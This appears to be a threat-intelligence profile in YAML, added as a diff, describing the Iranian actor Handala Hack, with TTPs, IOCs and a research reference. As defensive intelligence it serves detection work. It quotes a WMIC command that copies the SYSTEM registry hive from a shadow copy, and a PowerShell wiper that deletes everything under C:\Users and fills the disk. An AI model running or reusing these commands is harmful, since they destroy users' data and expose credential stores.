@@ -1,0 +1,65 @@
+description: Handala Hack, an Iranian threat actor affiliated with MOIS, targets government,
+  telecom, and other sectors using manual operations, off-the-shelf wipers, and encryption
+  tools.
+attribution: Void Manticore (Red Sandstorm, Banished Kitten)
+malware_families:
+- Handala Wiper
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - rundll32.exe
+  - wmic.exe
+  commandline:
+  - wmic.exe /node:[REDACTED_HOSTNAME] /user:[REDACTED] /password:[REDACTED] process call create "cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system c:\users\public"
+  powershell:
+  - '$usersFolder = C:\Users # Ensure the folder exists if (Test-Path $usersFolder)
+    { # Get all items in C:\Users, but not the Users folder itself $items = Get-ChildItem
+    -Path $usersFolder -Recurse # Remove each item (files and subfolders) inside C:\Users
+    foreach ($item in $items) { try { Remove-Item -Path $item.FullName -Recurse -Force
+    -ErrorAction Stop } catch { Write-Host Could not delete: $($item.FullName) } }
+    } $sourceFile = \\[REDACTED]\SYSVOL\[REDACTED]\scripts\Administration\install\handala.rar
+    $destinationFolder = C:\users if (!(Test-Path $destinationFolder)) { New-Item
+    -ItemType Directory -Path $destinationFolder | Out-Null } $driveLetter = (Split-Path
+    $destinationFolder -Qualifier).TrimEnd('':'',''\'') $i = 0 while ((Get-PSDrive
+    $driveLetter).Free -gt (Get-Item $sourceFile).Length) { Copy-Item $sourceFile
+    $destinationFolder\Handala_$i.gif $i++ }'
+  scripting_engine: []
+  registry_keys:
+  - HKLM
+  image_load:
+  - comsvcs.dll
+  network_connections:
+  - wmic.exe /node:[REDACTED_HOSTNAME] /user:[REDACTED] /password:[REDACTED] process
+    call create "cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system
+    c:\users\public"
+  - 107.189.19[.]52
+  - 146.185.219[.]235
+  file_activity:
+  - C:\Users\public
+  - C:\users\Handala_$i.gif
+  persistence:
+  - Scheduled task to trigger destructive components
+  - Group Policy Modification for wipers distribution
+  process_relations: []
+IOCs:
+  hashes:
+  - 5986ab04dd6b3d259935249741d3eff2
+  - 3cb9dea916432ffb8784ac36d1f2d3cd
+  - 3236facc7a30df4ba4e57fddfba41ec5
+  - 3dfb151d082df7937b01e2bb6030fe4a
+  - e035c858c1969cffc1a4978b86e90a30
+  ip_addresses:
+  - 82.25.35[.]25
+  - 31.57.35[.]223
+  - 107.189.19[.]52
+  - 146.185.219[.]235
+  - 188.92.255.X
+  - 209.198.131.X
+  - 149.88.26.X
+  - 169.150.227.X
+  domains: []
+  urls: []
+reference: https://research.checkpoint.com/2026/handala-hack-unveiling-groups-modus-operandi/
+date_of_publication: March 12, 2026
+file_creation_date: March 14, 2026
